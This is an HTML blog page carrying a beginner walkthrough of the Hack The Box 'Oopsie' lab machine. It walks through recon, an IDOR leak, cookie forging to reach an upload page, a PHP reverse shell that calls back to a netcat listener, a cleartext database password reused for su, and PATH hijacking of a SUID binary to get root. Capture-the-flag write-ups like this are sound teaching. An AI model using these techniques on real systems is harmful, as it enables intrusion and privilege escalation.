<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Oopsie - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,oopsie,tier-2,free-tier,php,web,custom-applications,session-handling,apache,reconnaissance,web-site-structure-discovery,cookie-manipulation,suid-exploitation,authentication-bypass,clear-text-credentials,arbitrary-file-upload,insecure-direct-object-reference,idor,path-hijacking"><meta name=description content="The aim of this walkthrough is to provide help with the Oopsie machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/oopsie/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Oopsie - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Oopsie machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/oopsie/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-11T20:00:00+00:00"><meta property="article:modified_time" content="2023-05-11T20:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Oopsie - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Oopsie machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Oopsie - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/oopsie/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Oopsie - Walkthrough","name":"HTB - Oopsie - Walkthrough","description":"The aim of this walkthrough is to provide help with the Oopsie machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","oopsie","tier-2","free-tier","php","web","custom-applications","session-handling","apache","reconnaissance","web-site-structure-discovery","cookie-manipulation","suid-exploitation","authentication-bypass","clear-text-credentials","arbitrary-file-upload","insecure-direct-object-reference","idor","path-hijacking"],"articleBody":"The aim of this walkthrough is to provide help with the Oopsie machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: With what kind of tool can intercept web traffic?\nA quick connection check,\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ ping $rhost -c 4 PING 10.129.95.191 (10.129.95.191) 56(84) bytes of data. 64 bytes from 10.129.95.191: icmp_seq=1 ttl=63 time=10.6 ms 64 bytes from 10.129.95.191: icmp_seq=2 ttl=63 time=11.0 ms 64 bytes from 10.129.95.191: icmp_seq=3 ttl=63 time=10.6 ms 64 bytes from 10.129.95.191: icmp_seq=4 ttl=63 time=11.1 ms --- 10.129.95.191 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 10.586/10.835/11.139/0.235 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ followed by the usual nmap scan\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 09:44 BST Nmap scan report for 10.129.95.191 Host is up (0.063s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA) | 256 241da417d4e32a9c905c30588f60778d (ECDSA) |_ 256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Welcome Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ determines that we have two open ports: port 22 and port 80. Building on these results, we try to get a fingerprint on the running web server.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ whatweb $rhost http://10.129.95.191 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@megacorp.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.95.191], Script, Title[Welcome] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ Putting the collected pieces together, this is the initial picture we get about our target:\ntarget is running Linux - Ubuntu – probably Ubuntu 18.04 ssh is enabled – version: openssh (1:7.6p1-4ubuntu0.3) target is serving a webpage – web server version Apache httpd 2.4.29 admin email:admin@megacorp.com found hostname: megacorp.com And haven’s even started out on our webpage. Let’s correct that. First we try accessing it with a browser. It looks like an automobile website.\nLooking around a bit we notice that none of the tabs seems to be working. All of them simply redirect us to - http://$rhost/# - which seems to be identical to the landing page.\nAlso, Wappalyzer has identified the front scripts as Font Awesome. We take a note of it, maybe it can lead somewhere.\nOtherwise, since nothing else pops up at this first look, we continue with dir busting.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ gobuster dir -u http://$rhost/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.95.191/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/05/12 09:48:18 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /css (Status: 301) [Size: 312] [--\u003e http://10.129.95.191/css/] /fonts (Status: 301) [Size: 314] [--\u003e http://10.129.95.191/fonts/] /images (Status: 301) [Size: 315] [--\u003e http://10.129.95.191/images/] /index.php (Status: 200) [Size: 10932] /js (Status: 301) [Size: 311] [--\u003e http://10.129.95.191/js/] /server-status (Status: 403) [Size: 278] /themes (Status: 301) [Size: 315] [--\u003e http://10.129.95.191/themes/] /uploads (Status: 301) [Size: 316] [--\u003e http://10.129.95.191/uploads/] =============================================================== 2023/05/12 09:48:24 Finished =============================================================== ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ Well, none of them are really accessible except the landing page, so nothing interesting here. We keep on looking.\nAs for the answer, a quick internet search should do it.\nproxy\nTASK 2 Question: What is the path to the directory on the webserver that returns a login page?\nTaking a quick look at the page source code that belongs to the main page seems to be rewarding.\nAt the end of the code, there is a script that names an interesting source location:\n... ... Following this mention, we head over to - http://$rhost/cdn-cgi/login/ - where we are welcomed with a login page.\nIt is important to take note of the Login as Guest option. Once we click on it, we are redirected to - http://$rhost/cdn-cgi/login/admin.php -.\n/cdn-cgi/login\nTASK 3 Question: What can be modified in Firefox to get access to the upload page?\nThere are a few interesting things we might notice once we start goofing around:\nthere is an interesting Uploads tab which is currently not accessible (“This action require super admin rights.”) it is possible to leak potentially confidential information by simply modifying the url parameters in the tabs Account, Branding and Clients Playing around with the url parameters and setting the id parameter to 1 under the Account tab\nhttp://10.129.95.191/cdn-cgi/login/admin.php?content=accounts\u0026id=1 reveals something very interesting.\nTaking an other look at the Uploads page, but this time using the Web Developer Tools (Firefox built-in tool) we notice the two cookies that are currently set.\ncookie #1 Name role Value guest cookie #2 Name user Value 2233 This is probably how the website decides if we are allowed to access the Uploads tab or not.\ncookie\nTASK 4 Question: What is the access ID of the admin user?\nCould we maybe simply modify them? Maybe use some of the leaked information we got when we accessed the Account tab? Let’s try and modify our cookies:\ncookie #1 Name role Value admin cookie #2 Name user Value 34322 Once we refresh the page, we are welcomed with an upload window.\n34322\nTASK 5 Question: On uploading a file, what directory does that file appear in on the server?\nSince an option to include our own files on the server is found, let’s strive for a reverse shell.\nUsing Wappalyzer on the current webpage reports php as the programming language. Therefore, it’s time to go and look for a reverse shell written in php.\nOn the pwnbox we do not have to look that far, since there is one already downloaded for us. We copy it to our current working directory, rename it (so that it’s not so noticeable) and we are almost ready to go.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ ll /usr/share/webshells/php/php-reverse-shell.php -rwxr-xr-x 1 root root 5.4K Jan 8 2022 /usr/share/webshells/php/php-reverse-shell.php ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ cp /usr/share/webshells/php/php-reverse-shell.php ./test.php ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ ll total 8.0K -rwxr-xr-x 1 htb-bluewalle htb-bluewalle 5.4K May 12 11:01 test.php ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ All that’s left is to customize it for our use. Modifying these two lines should do it:\n# test.php ... $ip = '127.0.0.1'; // CHANGE THIS $port = 1234; // CHANGE THIS ... # new test.php ... $ip = '$lhost'; // CHANGED - look up your lhost ip --\u003e \"ip a | grep tun 0\" $port = 4444; // CHANGED - arbitrary port --\u003e best to pick something above 1024 ... There is a nice confirmation we get once we upload it.\nIt’s time to see if it actually runs. But for that, we still need a netcat listener to catch it when it tries connecting back.\n# new terminal on lhost ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 With everything set up, it’s time to finally run our reverse shell. But where can we find it? Looking at our dir busting results from TASK1, our assumption is that it landed somewhere in the /uploads directory. So we try accessing it in the browser.\nNothing really seems to be happening, except that the page appears to be loading… But if we check our netcat listener, we will notice a reverse shell connection from our target.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.95.191. Ncat: Connection from 10.129.95.191:45114. Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 10:31:34 up 1:53, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ /uploads\nTASK 6 Question: What is the file that contains the password that is shared with the robert user?\nOne nice way to stabilize our netcat reverse shell is by going through the following motions:\n# Netcat Shell Stabilisation python -c 'import pty; pty.spawn(\"/bin/bash\")' # or python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm [CTRL+Z] to background the process # On lhost (turn off our own terminal echo) stty raw -echo; fg Since only python3 is installed on the target, we go with that option. Trying it get’s us a nice, stable and clear shell connection.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.95.191. Ncat: Connection from 10.129.95.191:45114. Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 10:31:34 up 1:53, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ which python $ python -c 'import pty; pty.spawn(\"/bin/bash\")' /bin/sh: 2: python: not found $ which python3 /usr/bin/python3 $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' TERM environment variable not set. www-data@oopsie:/$ clear clear TERM environment variable not set. www-data@oopsie:/$ export TERM=xterm export TERM=xterm www-data@oopsie:/$ ^Z [1]+ Stopped nc -lvnp 4444 ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-ab85cpsply]─[~/oopsie] └──╼ [★]$ stty raw -echo; fg nc -lvnp 4444 www-data@oopsie:/$clear Looking around a bit, we find the user flag in robert’s home directory.\nwww-data@oopsie:/$ whoami www-data www-data@oopsie:/$ pwd / www-data@oopsie:/$ uname -a Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux www-data@oopsie:/$ ls -hla total 100K drwxr-xr-x 24 root root 4.0K Oct 11 2021 . drwxr-xr-x 24 root root 4.0K Oct 11 2021 .. drwxr-xr-x 2 root root 4.0K Jul 28 2021 bin drwxr-xr-x 3 root root 4.0K Oct 11 2021 boot drwxr-xr-x 2 root root 4.0K Jul 28 2021 cdrom drwxr-xr-x 18 root root 3.9K May 12 08:37 dev drwxr-xr-x 97 root root 4.0K Oct 11 2021 etc drwxr-xr-x 3 root root 4.0K Jul 28 2021 home lrwxrwxrwx 1 root root 33 Jan 27 2020 initrd.img -\u003e boot/initrd.img-4.15.0-76-generic lrwxrwxrwx 1 root root 33 Oct 11 2021 initrd.img.old -\u003e boot/initrd.img-4.15.0-76-generic drwxr-xr-x 21 root root 4.0K Jul 28 2021 lib drwxr-xr-x 2 root root 4.0K Jul 28 2021 lib64 drwx------ 2 root root 16K Jan 23 2020 lost+found drwxr-xr-x 2 root root 4.0K Jul 28 2021 media drwxr-xr-x 2 root root 4.0K Jul 28 2021 mnt drwxr-xr-x 2 root root 4.0K Jul 28 2021 opt dr-xr-xr-x 123 root root 0 May 12 08:37 proc drwx------ 6 root root 4.0K Oct 11 2021 root drwxr-xr-x 27 root root 880 May 12 08:38 run drwxr-xr-x 2 root root 12K Jan 27 2020 sbin drwxr-xr-x 4 root root 4.0K Jul 28 2021 snap drwxr-xr-x 2 root root 4.0K Aug 5 2019 srv dr-xr-xr-x 13 root root 0 May 12 10:50 sys drwxrwxrwt 2 root root 4.0K May 12 10:30 tmp drwxr-xr-x 10 root root 4.0K Aug 5 2019 usr drwxr-xr-x 14 root root 4.0K Jul 28 2021 var lrwxrwxrwx 1 root root 30 Jan 27 2020 vmlinuz -\u003e boot/vmlinuz-4.15.0-76-generic lrwxrwxrwx 1 root root 30 Oct 11 2021 vmlinuz.old -\u003e boot/vmlinuz-4.15.0-76-generic www-data@oopsie:/$ cd home/ www-data@oopsie:/home$ ls -hla total 12K drwxr-xr-x 3 root root 4.0K Jul 28 2021 . drwxr-xr-x 24 root root 4.0K Oct 11 2021 .. drwxr-xr-x 3 robert robert 4.0K Jul 28 2021 robert www-data@oopsie:/home$ cd robert/ www-data@oopsie:/home/robert$ ls -hla total 28K drwxr-xr-x 3 robert robert 4.0K Jul 28 2021 . drwxr-xr-x 3 root root 4.0K Jul 28 2021 .. lrwxrwxrwx 1 robert robert 9 Jan 25 2020 .bash_history -\u003e /dev/null -rw-r--r-- 1 robert robert 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 robert robert 3.7K Apr 4 2018 .bashrc drwx------ 3 robert robert 4.0K Jul 28 2021 .gnupg -rw-r--r-- 1 robert robert 807 Apr 4 2018 .profile -rw-r--r-- 1 robert robert 33 Feb 25 2020 user.txt www-data@oopsie:/home/robert$ Notice the r– in the last permission column. Doesn’t that mean that everybody can read it? How nice, let’s grab it.\nwww-data@oopsie:/home/robert$ cat user.txt www-data@oopsie:/home/robert$ The question implies some interesting files containing some sensitive information. Let’s look for them. One of places we definitely need to check out is the location where the web page is installed.\nwww-data@oopsie:/var/www/html/cdn-cgi/login$ ls -hla total 28K drwxr-xr-x 2 root root 4.0K Jul 28 2021 . drwxr-xr-x 3 root root 4.0K Jul 28 2021 .. -rw-r--r-- 1 root root 6.3K Apr 15 2021 admin.php -rw-r--r-- 1 root root 80 Jan 24 2020 db.php -rw-r--r-- 1 root root 5.3K Apr 15 2021 index.php -rw-r--r-- 1 root root 0 Jan 24 2020 script.js www-data@oopsie:/var/www/html/cdn-cgi/login$ The question states that this password is shared with robert, so let’s look for any mention of his name.\nwww-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i robert $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); www-data@oopsie:/var/www/html/cdn-cgi/login$ There is one, but does it work?\nwww-data@oopsie:/var/www/html/cdn-cgi/login$ su robert Password: robert@oopsie:/var/www/html/cdn-cgi/login$ Yes, it worked. Now we have all the privileges that come with the robert user.\nHowever, the question is only interested in the exact file name and not in the password itself. To get that, we need to make some readjustments to the previously used command.\nrobert@oopsie:/var/www/html/cdn-cgi/login$ grep -i robert * db.php:$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); robert@oopsie:/var/www/html/cdn-cgi/login$ db.php\nTASK 7 Question: What executible is run with the option \"-group bugtracker\" to identify all files owned by the bugtracker group?\nAt first, using find and making sure to discard the error messages (2\u003e/dev/null) returns nothing.\nwww-data@oopsie:/home/robert$ find / -group bugtracker -executable 2\u003e/dev/null Could it be, that the file we are looking for is only executable by a certain group?\nwww-data@oopsie:/home/robert$ find / -group bugtracker 2\u003e/dev/null /usr/bin/bugtracker www-data@oopsie:/home/robert$ It certanly looks like it.\nfind\nTASK 8 Question: Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?\nwww-data@oopsie:/home/robert$ ls -hla /usr/bin/bugtracker -rwsr-xr-- 1 root bugtracker 8.6K Jan 25 2020 /usr/bin/bugtracker www-data@oopsie:/home/robert$ Looking at it, the executable has it’s suid bit set. So once run, it will run with root privileges (root is the owner).\nroot\nTASK 9 Question: What SUID stands for?\nA simple online search should help us out here.\nset owner user id\nTASK 10 Question: What is the name of the executable being called in an insecure manner?\nRunning the executable we found in TASK7 without any parameters provides us with some hints.\nrobert@oopsie:/$ ./usr/bin/bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 42 --------------- cat: /root/reports/42: No such file or directory robert@oopsie:/$ Like the one, that it’s using cat to access a non-existent file at - /root/reports/42 -. Or that cat is called without it’s full path being specified and NOT with /bin/cat (like it should be).\ncat\nSUBMIT FLAG Question: Submit user flag\nWe already grabbed it in TASK6.\nflag\nSUBMIT FLAG Question: Submit root flag\nWe continue where we left off (after TASK10).\nOur idea is to hijack the path that our system searches for when it looks for the cat’s binary/installation. So overwriting this location and implementing our own version of the cat command would result in our own version executing when the bugtracker binary is run.\nTherefore, we create our own version and save it in the /tmp directory (directory clears at reboot). Moreover, we make sure to assign everybody execute permissions.\nrobert@oopsie:/$ cd /tmp/ robert@oopsie:/tmp$ which bash /bin/bash robert@oopsie:/tmp$ echo \"/bin/bash\" \u003e cat robert@oopsie:/tmp$ ls -hla total 12K drwxrwxrwt 2 root root 4.0K May 12 12:18 . drwxr-xr-x 24 root root 4.0K Oct 11 2021 .. -rw-rw-r-- 1 robert robert 10 May 12 12:18 cat robert@oopsie:/tmp$ chmod a+x cat robert@oopsie:/tmp$ ls -hla total 12K drwxrwxrwt 2 root root 4.0K May 12 12:18 . drwxr-xr-x 24 root root 4.0K Oct 11 2021 .. -rwxrwxr-x 1 robert robert 10 May 12 12:18 cat robert@oopsie:/tmp$ All that’s left now is to overwrite the location which the system uses to search for the binaries. It can be done via environmental variables - quite similar to what we use to specify our rhost variable. Only, this one actually does persist throughout multiple shells since it’s an environmental variable, instead of a local one.\nMoreover, this time we do NOT want to add anything new. We only want to prepend our location to the other locations.\nrobert@oopsie:/tmp$ export PATH=/tmp:$PATH robert@oopsie:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games robert@oopsie:/tmp$ Finally, running the bugtracker binary after everything is set up will welcome us with a root shell. And since we already know where the root flag is, we simply grab it.\nrobert@oopsie:/tmp$ /usr/bin/bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 42 --------------- root@oopsie:/tmp# whoami root root@oopsie:/tmp# cat /root/root.txt root@oopsie:/tmp# flag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"2924","inLanguage":"en","datePublished":"2023-05-11T20:00:00Z","dateModified":"2023-05-11T20:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/oopsie/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Oopsie - Walkthrough</h1><div class=post-meta><span title='2023-05-11 20:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2924 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#task-9><strong>TASK 9</strong></a></li><li><a href=#task-10><strong>TASK 10</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li><li><a href=#submit-flag-1><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Oopsie</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 2</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided 